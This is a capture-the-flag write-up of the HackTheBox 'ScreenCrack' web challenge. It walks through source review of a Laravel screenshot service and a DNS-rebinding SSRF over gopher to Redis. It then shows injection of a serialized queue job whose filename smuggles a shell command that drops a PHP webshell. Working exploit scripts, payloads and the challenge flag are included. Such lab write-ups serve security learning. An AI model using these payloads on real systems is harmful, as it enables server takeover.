# Web

## Description

New screenshot service just dropped! They talk a lot but can they hack it?

URL: [https://app.hackthebox.com/challenges/ScreenCrack](https://app.hackthebox.com/challenges/ScreenCrack)
## Analysis

The application is able to visit a URL, take a screenshot or show source of the webpage.

![screencrack.png](/assets/ctf/htb/web/screencrack.png)

The application is based on Laravel PHP framework.

Let's inspect `.env` first, this probably is not what the challenge version will have but still.
```bash
APP_ENV=dev
APP_KEY=base64:7d7npWEozOBnBdNY9z2fq+Zt7KQgYpO6d7eARF01MuI=
APP_SECRET=407dbba063eff3e15247ac5eda7e41d4

APP_DEBUG=True
QUEUE_CONNECTION=redis
REDIS_HOST=127.0.0.1
REDIS_PORT=6379

DATABASE_URL="sqlite://www/database/app.db"
```

Next we should inspect `routes` directory, that's where usually main part of route handling is done.

`routes/api.php`
```php
<?php
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\SiteShotController;
/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "api" middleware group. Make something great!
*/
Route::post('/getss', [SiteShotController::class, 'getSS']);
Route::post('/get-html', [SiteShotController::class, 'getHtml']);
```

`routes/web.php`
```php
<?php
use Illuminate\Support\Facades\Route;
/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
*/
Route::get('/', function () { return view('index'); });
```

Next we should take a look at Controller classes, because they contain the logic of route handling.
```php
<?php
namespace App\Http\Controllers;

use App\Services\SiteShotService;
use Illuminate\Http\Request;

class SiteShotController extends Controller {
    public function getHtml(Request $request) {
        $site = $request->input('site');

        if (!$this->validateUrl($site)) { return response()->json([ 'status' => 'failed', 'message' => 'Dont do naughty stuff.' ]); }
        if (!isset($site))              { return response()->json([ 'status' => 'failed', 'message' => 'Need site parameter' ]); }

        $ssSrv = new SiteShotService();
        return $ssSrv->getHtmlResp($site);
    }

    public function getSS(Request $request) {
        $site = $request->input('site');
        
        if (!$this->validateUrl($site)) { return response()->json([ 'status' => 'failed', 'message' => 'Dont do naughty stuff.' ]); }
        if (!isset($site))              { return response()->json([ 'status' => 'failed', 'message' => 'Need site parameter' ]); }

        if (!(substr($site, 0, strlen("http://")) === "http://" || substr($site, 0, strlen("https://")) === "https://")) {
            $site = "http://" . $site;
        }

        $ssSrv = new SiteShotService();
        return $ssSrv->getScreenShotResp($site);
    }

    private function isValidIPv4($ip) { return filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) !== false; }

    private function isValidDomain($domain) {
        $pattern = '/^(?:(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9][a-z0-9-]{0,61}[a-z0-9])$/i';
        if (!preg_match($pattern, $domain)) { return false; }
        if (!checkdnsrr($domain, 'A') && !checkdnsrr($domain, 'AAAA')) { return false; }
        return true;
    }

    private function isLocalIP($ip) {
        if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE)) { return true; }
        if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_RES_RANGE)) { return true; }
        return false;
    }

    private function validateUrl($url) {
        $parsedUrl = parse_url($url);
        if (!isset($parsedUrl['host'])) { return false; }
        if ($this->isValidIPv4($parsedUrl['host']) && $this->isLocalIP($parsedUrl['host'])) { return false; }
        if (!$this->isValidDomain($parsedUrl['host'])) { return false; }
        return true;
    }
}
```

`Show Screenshot` calls `/api/getss` and the handler for that is `function getSS`. 
`View Source` calls `/api/get-html` and the handler for that is `function getHtml`.

Both calls are POST methods.

To make this calls the url should be valid.
1. It contains the `host` (domain) 
2. Should be valid IPv4, but not local address.
3. Should be a valid domain.

For the screenshot endpoint the url must start with `http[s]://`.

```php
<?php
namespace App\Services;

use Ramsey\Uuid\Uuid;
use App\Jobs\rmFile;
use App\Message\FileQueue;
use Illuminate\Support\Facades\Queue;

class SiteShotService {
    public function getHtmlResp($url) {
        // Create a new cURL resource
        $ch = curl_init();

        // Set cURL options
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        // Execute cURL request
        $response = curl_exec($ch);

        // Check for errors
        if (curl_errno($ch)) {
            $error = curl_error($ch);
            curl_close($ch);
            return response()->json([ 'status' => 'failed', ]);
        }

        // Get HTTP response code
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        // Close cURL resource
        curl_close($ch);

        $uuidStr = Uuid::uuid4()->toString();
        $filequeue = new FileQueue($uuidStr, "txt");
        $filenameLocal = $filequeue->buildFilePath();
        $filenameResp = $filequeue->buildFilePathWeb();

        $rf = new rmFile($filequeue);
        Queue::push($rf);

        file_put_contents($filenameLocal, $response);

        return response()->json([ 'status' => 'success', 'filename' => $filenameResp, ]);
    }

    public function getScreenShotResp($url) {
        $ssurl = "https://api.screenshotmachine.com/?key=6b76b2&dimension=1024x768&url=" . $url;

        try {
            $filecontents = file_get_contents($ssurl);

            $uuidStr = uuid::uuid4()->tostring();
            $filequeue = new filequeue($uuidStr, "png");
            $filenameLocal = $filequeue->buildfilepath();
            $filenameResp = $filequeue->buildfilepathweb();

            $rf = new rmFile($filequeue);
            Queue::push($rf);

            file_put_contents($filenameLocal, $filecontents);

            return response()->json([ 'status' => 'success', 'site' => $url, 'image' => $filenameResp, ]);
        } catch (exception $e) {
            return response()->json([ 'status' => 'failed', ]);
        }
    }
}
```

The `FileQueue` handles filenames and checks that respective directories exist. For `deleteFile` `system` calls are used, this could be entrypoint if we can somehow manipulate filenames, but they are pregenerated from UUID4 and extensions are also hardcoded to `png` or `txt`.
```php
<?php
namespace App\Message;

class FileQueue {
    public $filePath;

    public function __construct(string $uuid, string $type) {
        $this->uuid = $uuid;
        $this->ext = $type;

        if (!file_exists("/www/public/src")) { mkdir("/www/public/src", 0755); }
        if (!file_exists("/www/public/ss")) { mkdir("/www/public/ss", 0755); }
    }

    public function buildFilePath(): string {
        $filename = $this->uuid . "." . $this->ext;
        if ($this->ext === "txt") { $this->filePath = join(DIRECTORY_SEPARATOR, ["/www/public/src", $filename]); }
        if ($this->ext === "png") { $this->filePath = join(DIRECTORY_SEPARATOR, ["/www/public/ss", $filename]); }
        return $this->filePath;
    }

    public function buildFilePathWeb(): string {
        $filename = $this->uuid . "." . $this->ext;
        if ($this->ext === "txt") { $this->filePath = join(DIRECTORY_SEPARATOR, ["/src", $filename]); }
        if ($this->ext === "png") { $this->filePath = join(DIRECTORY_SEPARATOR, ["/ss", $filename]); }
        return $this->filePath;
    }

    public function deleteFile() {
        $filepath = $this->buildFilePath();
        system("echo '" . $this->uuid . "'>>halo");
        system("rm " . $filepath);
    }
}
```

```php
<?php
namespace App\Jobs;

use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldBeUnique;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Foundation\Bus\Dispatchable;
use Illuminate\Queue\InteractsWithQueue;
use Illuminate\Queue\SerializesModels;
use App\Message\FileQueue;

class rmFile implements ShouldQueue {
    use Dispatchable, InteractsWithQueue, Queueable, SerializesModels;

    public $fileQueue;
    /* Create a new job instance. */
    public function __construct(FileQueue $fileQueue) {
        $this->fileQueue = $fileQueue;
    }

    /* Execute the job. */
    public function handle(): void {
        $this->fileQueue->deleteFile();
    }
}
```

The odd thing is there's Redis server running in background, but there's no way to interact with this application. The server is there for a reason and we might need SSRF.

There's 2 more oddities. Why the f\*ck is `getHtmlResp` using curl to get server source and why is `getScreenShotResp` using `file_get_contents` to get contents from URL. As a programmer you should try to follow DRY method and this is pure garbage. 

Anyway, the `getHtmlResp` function is not restricting us from using other protocols, but the URLs must have domains inside them (This rules out the `file://` protocol).

**[curl](https://github.com/curl/curl)**: _A command line tool and library for transferring data with URL syntax, supporting DICT, FILE, FTP, FTPS, GOPHER, GOPHERS, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, MQTT, POP3, POP3S, RTMP, RTMPS, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET, TFTP, WS and WSS._

Now we need to perform SSRF, request is already made for us and we just need to make it work. `localhost` doesn't work because of Regex pattern, we need an actual domain that can respond to our requests. The curl won't perform redirection by itself so that can't be done. 

Payloads from [Pravinrp > SSRF payloads](https://pravinponnusamy.medium.com/ssrf-payloads-f09b2a86a8b4)  didn't work as it couldn't bypass valid url function.

Focusing on DNS we can find relative attack: [DNS rebinding](https://www.wikiwand.com/en/articles/DNS_rebinding) is a method of manipulating resolution of domain names that is commonly used as a form of [computer attack](https://www.wikiwand.com/en/articles/Computer_security "Computer security").

[https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html) ([src](https://github.com/taviso/rbndr))

![screencrack-1.png](/assets/ctf/htb/web/screencrack-1.png)

Success

![screencrack-2.png](/assets/ctf/htb/web/screencrack-2.png)

[https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#ssrf-talking-to-redis](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#ssrf-talking-to-redis)

This was quite troublesome because turns out `gopher` protocol was successful, but the `curl` hangs as it's awaiting new instructions as an interactive service. You need to execute and quit right away so can catch output and end the interaction within 3 seconds so curl doesn't hang.

![screencrack-3.png](/assets/ctf/htb/web/screencrack-3.png)

To make interaction easier I made a script:
```python
from urllib.parse import quote
import requests
import json

URL = 'http://94.237.59.63:40814'   # Remote
URL = 'http://localhost:1337'       # Local
API = URL + '/api/get-html'         # Vuln API
DNS = '7f000000.7f000001.rbndr.us'  # Localhost

payload = '''
SELECT 0
KEYS *
'''.strip() 
payload += '\nQUIT'
print(f'{payload=}')

# Dont urlencode spaces with `+`, use `%20`
data = { 'site': f'gopher://{DNS}:6379/_{quote(payload)}' }
print(f'{data=}')

resp = requests.post(API, json=data).json()
resp = requests.get(f'{URL}{resp["filename"]}')
for line in resp.text.split('\n'):
    try:    print(json.dumps(json.loads(line.strip()), indent=2))
    except: print(line)
```

> **Note**: Turns out rebinder service uses any IP between A and B, and is random. I chose `A: 127.0.0.1` and `B: 127.0.0.2` to increase chance of `127.0.0.1`\~\~\~

```bash
payload='INFO keyspace\nQUIT'
data={'site': 'gopher://7f000000.7f000001.rbndr.us:6379/_INFO%20keyspace%0AQUIT'}
$44
# Keyspace
db0:keys=2,expires=0,avg_ttl=0

+OK
```

```bash
payload='SELECT 0\nKEYS *\nQUIT'
data={'site': 'gopher://7f000000.7f000001.rbndr.us:6379/_SELECT%200%0AKEYS%20%2A%0AQUIT'}
+OK
*2
$38
laravel_database_queues:default:notify
$31
laravel_database_queues:default
+OK
```

```bash
payload='SELECT 0\nLRANGE laravel_database_queues:default 0 -1\nQUIT'
data={'site': 'gopher://7f000000.7f000001.rbndr.us:6379/_SELECT%200%0ALRANGE%20laravel_database_queues%3Adefault%200%20-1%0AQUIT'}
+OK
*18
$590
{
  "uuid": "831da2e3-9a9d-42ed-8b2e-bb5d7c807f7e",
  "displayName": "App\\Jobs\\rmFile",
  "job": "Illuminate\\Queue\\CallQueuedHandler@call",
  "maxTries": null,
  "maxExceptions": null,
  "failOnTimeout": false,
  "backoff": null,
  "timeout": null,
  "retryUntil": null,
  "data": {
    "commandName": "App\\Jobs\\rmFile",
    "command": "O:15:\"App\\Jobs\\rmFile\":1:{s:9:\"fileQueue\";O:21:\"App\\Message\\FileQueue\":3:{s:8:\"filePath\";s:45:\"/src/52ac85a2-7dfb-4c3a-9e14-c8fc2338f792.txt\";s:4:\"uuid\";s:36:\"52ac85a2-7dfb-4c3a-9e14-c8fc2338f792\";s:3:\"ext\";s:3:\"txt\";}}"
  },
  "id": "G6ocQ5u4wrWzqlfORfSkGZHrv4hcjIqC",
  "attempts": 0
}
$590
{
  "uuid": "fc1d653a-8de5-419e-830e-a85efa316cee",
  "displayName": "App\\Jobs\\rmFile",
  "job": "Illuminate\\Queue\\CallQueuedHandler@call",
  "maxTries": null,
  "maxExceptions": null,
  "failOnTimeout": false,
  "backoff": null,
  "timeout": null,
  "retryUntil": null,
  "data": {
    "commandName": "App\\Jobs\\rmFile",
    "command": "O:15:\"App\\Jobs\\rmFile\":1:{s:9:\"fileQueue\";O:21:\"App\\Message\\FileQueue\":3:{s:8:\"filePath\";s:45:\"/src/1738777a-6a57-4cae-92c3-47984e6c57ee.txt\";s:4:\"uuid\";s:36:\"1738777a-6a57-4cae-92c3-47984e6c57ee\";s:3:\"ext\";s:3:\"txt\";}}"
  },
  "id": "vEuyvTdj0KKA5OhmOMbx2rOn6vPE51uU",
  "attempts": 0
}
...
+OK
```

Easy way to root failed ([https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#php-webshell](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#php-webshell))
```bash
payload='config set dir /www/public\nconfig set dbfilename redis.php\nset test "<?php echo system($_REQUEST[0]); ?>"\nsave\nQUIT'
data={'site': 'gopher://7f000000.7f000001.rbndr.us:6379/_config%20set%20dir%20/www/public%0Aconfig%20set%20dbfilename%20redis.php%0Aset%20test%20%22%3C%3Fphp%20echo%20system%28%24_REQUEST%5B0%5D%29%3B%20%3F%3E%22%0Asave%0AQUIT'}
-ERR CONFIG SET failed (possibly related to argument 'dir') - can't set protected config
-ERR CONFIG SET failed (possibly related to argument 'dbfilename') - can't set protected config
```

So the queue is controlled by Redis, we have access to Redis and if you remember the files are removed by `system` call for whatever reason (???) and we can hijack Redis object, modify and pwn the *~~sh\*t out it~~* system

```php
    public function deleteFile() {
        $filepath = $this->buildFilePath();
        system("echo '" . $this->uuid . "'>>halo");
        system("rm " . $filepath);
    }
```

Welp first of all we need an serialized object and the easier way I thought of getting it was to make Docker do heavy work since I was running it locally:
```php
<?php
/* Inside the `challenge` or `www` in Docker */
require __DIR__ . "/vendor/autoload.php";

use Ramsey\Uuid\Uuid;
use App\Jobs\rmFile;
use App\Message\FileQueue;

/* └─$ echo '<?PHP echo system($_REQUEST[0]);?>' | base64 */
$filequeue = new FileQueue("; echo PD9QSFAgZWNobyBzeXN0ZW0oJF9SRVFVRVNUWzBdKTs/Pgo=|base64 -d > /www/public/t.php; #", "txt");
$filenameLocal = $filequeue->buildFilePath();
$filenameResp = $filequeue->buildFilePathWeb();

$rf = new rmFile($filequeue);

$serialized = serialize($rf);
$slashes = addslashes($serialized);
echo $slashes . PHP_EOL;
```

> **Note**: The extension can't really be effected because of programming logic, but we can use the filename!

The PoC script does following
1. Create a dummy object
2. Pop last item from cache (aka dummy object)
3. Modify the last item using our serialized payload
4. Pop the previous request object
5. Push new malicious object
6. Show last entry (for verification)

```python
import json
from urllib.parse import quote
import requests

URL = 'http://83.136.252.94:30715'  # Remote
URL = 'http://localhost:1337'       # Local
API = URL + '/api/get-html'         # Vuln API
DNS = '7f000000.7f000001.rbndr.us'  # Localhost

SERIALIZED_PAYLOAD = 'O:15:\"App\\Jobs\\rmFile\":1:{s:9:\"fileQueue\";O:21:\"App\\Message\\FileQueue\":3:{s:8:\"filePath\";s:97:\"/src/; echo PD9QSFAgZWNobyBzeXN0ZW0oJF9SRVFVRVNUWzBdKTs/Pgo=|base64 -d > /www/public/t.php; #.txt\";s:4:\"uuid\";s:88:\"; echo PD9QSFAgZWNobyBzeXN0ZW0oJF9SRVFVRVNUWzBdKTs/Pgo=|base64 -d > /www/public/t.php; #\";s:3:\"ext\";s:3:\"txt\";}}'

data = { 'site': f'http://{DNS}/' }
resp = requests.post(API, json=data).json()
print(f'{data=}')
print(resp)

# --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- ---

payload = 'RPOP laravel_database_queues:default'
payload = (payload + '\nQUIT').strip()
data = { 'site': f'gopher://{DNS}:6379/_{quote(payload)}' }
resp = requests.post(API, json=data).json()
print(f'{payload=}')
print(f'{data=}')
print(f'{resp=}')
resp = requests.get(f'{URL}{resp["filename"]}')
for line in resp.text.split('\n'):
    try:    
        queue_object = json.loads(line.strip())
        queue_object['data']['command'] = SERIALIZED_PAYLOAD
        queue_object = json.dumps(queue_object)
        print(queue_object)
        break
    except: 
        print(line)
else:
    print(f'Failed getting queue_object!')
    exit(1)

# --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- ---

payload = '''
RPOP laravel_database_queues:default
RPUSH laravel_database_queues:default '%s'
LRANGE laravel_database_queues:default 0 -1
''' % queue_object
payload = (payload.strip() + '\nQUIT').strip()
data = { 'site': f'gopher://{DNS}:6379/_{quote(payload)}' }
resp = requests.post(API, json=data).json()
print(f'{payload=}')
print(f'{data=}')
print(f'{resp=}')
resp = requests.get(f'{URL}{resp["filename"]}')
for line in resp.text.split('\n'):
    try:    print(json.dumps(json.loads(line.strip()), indent=2))
    except: print(line)
```

Why are we even deleting objects? Well... the queue worker runs each queue remotely every 10minutes............... (`job-runner.sh`)
```bash
	php artisan queue:work --queue=default -v --sleep=600
```

Run the SSRF and wait for fu\*king 10minutes and then check on `http://<SERVER_IP>/t.php` for webshell 🎉

```bash
➜ curl http://83.136.252.94:30715/t.php?0=id
uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)
uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)
➜ curl http://83.136.252.94:30715/t.php?0=cat%20/flag
HTB{my_j0b_qu3u3_h4s_h0l3s}
HTB{my_j0b_qu3u3_h4s_h0l3s}
```

> Flag: `HTB{my_j0b_qu3u3_h4s_h0l3s}`

